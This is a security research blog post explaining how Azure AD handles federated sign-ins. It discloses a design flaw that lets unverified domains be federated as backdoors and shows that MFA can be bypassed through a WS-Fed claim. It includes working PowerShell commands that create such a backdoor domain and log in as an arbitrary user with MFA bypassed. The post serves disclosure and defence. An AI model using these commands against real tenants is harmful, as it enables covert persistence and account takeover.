+++
title = "Deep-dive to Azure Active Directory Identity Federation"
date = "2019-06-12"
lastmod = "2019-10-30"
categories =["blog"]
tags = ["Office 365","Azure Active Directory","Identity","Federation","SSO","ADFS"]
thumbnail = "/images/posts/aad_deepdive.png"
+++

Identity federation is regarded as the most secure way to authenticate users to Azure AD. In this blog, I’ll deep-dive to identity federation implementation of Azure AD and point out some serious security issues.

<!--more-->


# Introduction

## What is Identity Federation

Identity federation, in general, refers to a situation, where the **service provider (SP)** trusts to identities provided by an **identity provider (IdP)**.
Technically, the IdP provides a **security token (ST)** which contains information about the user. ST is signed by IdP using a private key of the agreed-upon certificate.
The SP verifies the ST using the public key of the agreed-upon certificate.

## Protocols

There are two commonly used federation protocols: **Web Services Federation Language (WS-Federation)** and **Security Assertion Markup Language (SAML)**.
WS-Federation is purely a protocol, whereas SAML is both protocol and token type. For instance, Active Directory Federation Services (AD FS) is (by default)
using WS-Federation protocol with SAML 1.1 tokens.

## Authentication flows

There are two different authentication flows: **SP-initiated** and **IdP-initiated**.

The typically used **SP-initiated** authentication flow is illustrated in Figure 1. The steps are:

1. The user tries to access SP using a browser
2. SP sends a redirect to the user's browser
3. The browser connects IdP and IdP performs an authentication
4. After successful authentication, SP creates ST and redirects the browser back to SP
5. The browser accesses SP

![SP initiated](/images/posts/aad_sp2idp.png)
**Figure 1: SP-initiated authentication flow**

The **IdP-initiated** authentication flow is illustrated in Figure 2. The steps are:

1. The user connects to IdP with browser and IdP performs an authentication
2. After successful authentication, SP creates ST and redirects the browser back to SP
3. The browser accesses SP

![IDP initiated](/images/posts/aad_idp2sp.png)
**Figure 2: IdP-initiated authentication flow**

# Azure AD Identity Federation under-the-hood

The Azure AD authentication flow for federated identities is illustrated in Figure 3. 
The process is the same for both SP (step 5) and IdP (step 3) initiated authentication flows.

Azure AD supports two authentication protocols, SAMLP (SAML 2.0) and WSFED (WS-Federation). Next, the steps are explained in more detail.


![The federation flow](/images/posts/aad_authflow.png)
**Figure 3: Azure AD identity federation IdP authentication flow**

## 1. Check the syntax

The first step of the authentication flow is to check the syntax of the authentication request. 
The authentication request is sent to https://login.microsoftonline.com/login.srf using HTTP POST protocol. Required query parameters are listed in the following tables.

<a href="http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html" target=_blank">SAMLP</a>:

Parameter | Description
--- | ---
RelayState | In SP initiated authentication, this parameter must be resent to SP unmodified. <br>With IdP initiated authentication can be left to empty.
SAMLResponse | Base 64 encoded signed SAML2 token.

<a href="http://docs.oasis-open.org/wsfed/federation/v1.2/cd/ws-federation-1.2-spec-cd-02.html" target=_blank">WSFED</a>:

Parameter | Description
--- | ---
wa | This is the required parameter, and it specifies the action to be performed. <br>Must be “wsignin1.0”
wctx | This optional parameter is a context value. If set, must be returned with the issued token. <br>In SP initiated authentication this parameter must be resent to SP unmodified.<br>With IdP initiated authentication can be left to empty.
wresult | This required parameter specifies the result of the token issuance as signed SAML 1.1 token. 

## 2. Syntax valid?
If the syntax is valid the flow proceeds to the next step. If not, one of the following error codes are shown, and the authentication process is terminated.

<a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:

Error code | Message | Description
--- | --- | ---
AADSTS20012	| WsFedMessageInvalid - There's an issue with your federated Identity Provider. Contact your IDP to resolve this issue. | WSFED: The SAML token xml format was not valid. Missing tags etc.
AADSTS90013	| InvalidUserInput - The input from the user is not valid. | WSFED: wresult parameter missing. 
AADSTS90081 | OrgIdWsFederationMessageInvalid - An error occurred when the service tried to process a WS-Federation message. The message is not valid. | WSFED: wa parameter missing.<br>SAMLP: SAMLResponse parameter missing.

## 3. Find the federation realm
Now the syntax of the authentication request is checked and found to be valid. Next step is to find the federation realm, i.e., the tenant to be authenticated to.

Based on my research, the domain name is not used at all. Instead, Azure AD has a table of Azure AD federation realms having at least the following attributes. 

Attribute | Description
--- | ---
Issuer | A string, usually a URI, identifying the IdP. <br><br>The issuer is unique; it can be associated only to one tenant at any given time.
Tenant | String (GUID) of the tenant the issuer is associated with. <br> <br>The tenant can have multiple issuers.
Signing certificate | A base 64 encoded public key of the signing certificate. <br><br>Not unique, can be associated with multiple tenants and issuers.

As we already know, the domains registered to Azure AD can be either **Managed** or **Federated**. When a domain is converted to federated, it is also added to the Azure AD Federation realms table. 
Normally, only validated domains can be used in Azure AD. This means that unless the domain is validated, it cannot be used as a login name or email address. 

However, I discovered a bug in Azure AD, which I reported to Microsoft on November 22nd 2018. **The bug allows using unvalidated domains as backdoors**. 
I finally got a response from Microsoft on Oct 25th 2019. So, this is also a feature and won't be fixed:

> Our team had assessed this issue, and this behavior is considered by design. Also, to exploit this, a user needs to have admin privileges.


**Example 1:** Creating a domain and changing the authentication method using MsOnline PowerShell module:
{{< highlight powershell >}}
# Create a new federated domain
New-MsolDomain -Name microsoft.com

# Save the issuer and login/logoff uri to variables
$issuer="http://myissuer/microsoft.com"
$uri="http://myissuer"

# Save the public key to a variable
$certificate = "MIIDcTCCAligAwIBAgIBADANBgkqhkiG9w0BAQ0FADBSMQswCQYDVQQGEwJmaTESMBAGA1UECAwJUGlya2FubWFhMREwDwYDVQQKDAhHZXJlbmlvczEcMBoGA1UEAwwTaGFjay5vMzY1ZG9tYWluLm9yZzAeFw0xODAyMjExMzEyNDVaFw0yODAyMTkxMzEyNDVaMFIxCzAJBgNVBAYTAmZpMRIwEAYDVQQIDAlQaXJrYW5tYWExETAPBgNVBAoMCEdlcmVuaW9zMRwwGgYDVQQDDBNoYWNrLm8zNjVkb21haW4ub3JnMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQIApH73Hcv30uHHve6Zd3E/aEeFgQRMZD/CJUQC2DfSk0mDX8X75MIo7gP+62ZTUsOxhSDdOOVYshK8Kyk9VZvo21A5hDcCudXxc/eifCdwGLalCaOQt8pdMlYJgsBDcieMNToCx2pXp1PvkJdKc2JiXQCIAolJySbNXGJbBG1Oh4tty7lEXUqHpHgqiIJCb64q64BIQpZr/WQG0QgtH/gwWYz7b/psNA4xVi8RJnRUl7I62+j0WVSTih2j3kK20j5OIW9Rk+5XoHJ5npOBM84pYJ6yxMz1sOdSqOccAjSVHWFKdM437PxAPeiXAXoBKczGZ72Q8ocz2YSLGKcSMnYCrhECAwEAAaNQME4wHQYDVR0OBBYEFNu32o5XSIQ0lvwB+d2cnTlrtk2PMB8GA1UdIwQYMBaAFNu32o5XSIQ0lvwB+d2cnTlrtk2PMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQENBQADggECAHokwTra0dlyG5jj08TiHlx1pJFnqlejjpFXaItuk2jEBfO/fv1AJaETSR5vupFfDHA337oPiqWugxai1TIvJGKhZImNloMj8lyeZk/9/5Pt2X4N8r1JpAQzt+Ez3z7aNrAFxRjJ0Y+rDDcSItZ5vaXJ5PqBvR7icjIBaXrHVFUC6OZ2RkebbpajbIdt6U/P7ovg7L1J6LAzL/asATZzM3Mjn+9rsC9xLbJwuEabLU+BxySsNo8TULYi9O2MSJ9FvddE6n3OPqrmldldCrb6OugK/pzCwjTnVgRtrHNJc+zKavbiu0Yfp8uYhvCCWAakdQ8g6ZNJ1TGSaYNIrpTIhXIJ"

# Set the authentication method
Set-MsolDomainAuthentication -DomainName microsoft.com -Authentication Federated -IssuerUri $issuer -LogOffUri $uri -PassiveLogOnUri $uri -SigningCertificate $certificate 
{{< /highlight>}}

**Example 2:** Creating a domain and changing the authentication method using <a href="/aadinternals"" target="_blank">AADInternals</a> PowerShell module:
{{< highlight powershell >}}
# Create a new backdoor
New-AADIntBackdoor -DomainName microsoft.com
{{< /highlight>}}

**Output:**
```
Are you sure to create backdoor with microsoft.com? Type YES to continue or CTRL+C to abort: yes

Authentication     : Managed
Capabilities       : None
IsDefault          : false
IsInitial          : false
Name               : microsoft.com
RootDomain         : 
Status             : Unverified
VerificationMethod : 

Backdoor created. Domain: microsoft.com, issuer=http://any.sts/B231A11F
```

## 4. Realm found?
If the realm was found, the flow proceeds to the next step. If not, the following error is shown.

<a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:

Error code | Message | Description
--- | --- | ---
AADSTS50107 | Requested federation realm object ‘issuer’ does not exist | The issuer was not found. <br><br>**Note:** If the domain is recently changed to federated, it can take up to 30 minutes for the change to take effect.

## 5. Public key matches the realm?
After finding the realm, the public key received in the authentication request is checked against the signing certificate of the realm. If they match, the authentication flow proceeds to the next step. If not, the following error is shown.

<a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:

Error code | Message | Description
--- | --- | ---
AADSTS50008 | InvalidSamlToken - SAML assertion is missing or misconfigured in the token. | WSFED: The signing certificate does not match the realm’s public key.
AADSTS500081 | Unable to verify the token signature. The signing key identifier does not match any valid registered keys. | SAMLP: The signing certificate does not match the realm’s public key.

## 6. Check the signature
After checking that the public key matches, the signature of the SAML or SAML2 token are checked. Checking the signature allows Azure AD to make sure that the token is issued by the correct certificate, and that it is not tampered.

## 7. Is the signature valid?
If the signature is valid, authentication flow proceeds to the next step. If the signature is not valid, the following error is shown.

<a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:

Error code | Message | Description
--- | --- | ---
AADSTS50008 | InvalidSamlToken - SAML assertion is missing or misconfigured in the token. | WSFED: The signature is invalid: the content of the token might have been altered.
AADSTS50006 | InvalidSignature - Signature verification failed because of an invalid signature | SAMLP: The signature is invalid: the content of the token might have been altered.

## 8. Search the user
After the validity of the token is confirmed, the corresponding user object is searched from the tenant. The token contains the user’s UserPrincipalName and ImmutableId. **Azure AD searches the user object using only the ImmutableId**; the UserPrincipalName is not used at all. Thus, the UserPrincipalName can be any string, such as rudolf@santaclaus.com.

The search procedure searches for a user object having the matching ImmutableId. I would like to emphasize that **there are no sanity checks whether the user’s domain matches the federation realm**. In practice, this allows all tenant’s IdPs to create valid tokens for any user of the tenant. This includes xxx.onmicrosoft.com and external users.

## 9. User found?
If the user object is found, the authentication flow proceeds to the final step. If not, the following error is shown.

<a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes" target=_blank">Error codes</a>:

Error code | Message | Description
--- | --- | ---
AADSTS51004 | UserAccountNotInDirectory - The user account doesn’t exist in the directory. <br><br>The user account "ImmutableId" does not exist in the "tenant guid" directory. To sign into this application, the account must be added to the directory. | The user does not exist in the tenant.

## 10. Log the user in
The last step of the authentication flow is to log the user in.

After the login, post-authentication steps, such as **Multi-Factor Authentication (MFA)** and Conditional Access Policies are applied.

WS-FED token has a special functionality, which allows bypassing the MFA. This functionality is meant for the situation, where IdP performs MFA and the Azure AD MFA needs to be bypassed. This information is delivered to Azure AD using a special claim that can be embedded to WS-FED tokens. Azure AD bypasses MFA every time this claim is present in WS-FED token, regardless of has the IdP actually performed the MFA.

**Example:** Bypass the MFA using the backdoor created above in step 3.
{{< highlight powershell >}}
# Login and bypass MFA
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true
{{< /highlight>}}